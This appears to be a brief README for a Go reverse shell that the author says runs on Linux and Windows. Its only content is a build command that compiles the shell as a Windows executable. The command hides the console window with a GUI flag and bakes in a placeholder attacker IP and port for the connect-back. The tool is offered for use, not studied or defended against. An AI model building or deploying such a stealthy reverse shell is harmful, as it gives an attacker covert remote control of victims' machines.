# Go-Reverse-Shell
Here is my Go reverse shell that works on both Linux and Windows environments.

## Compilation
* For Windows, we compile the Go reverse shell with the following commmnd:
```bash
GOOS=windows GOARCH=amd64 go build --ldflags="-H=windowsgui -X main.shell_params=[IP]:[PORT]" -o revshell.exe revshell.go
```
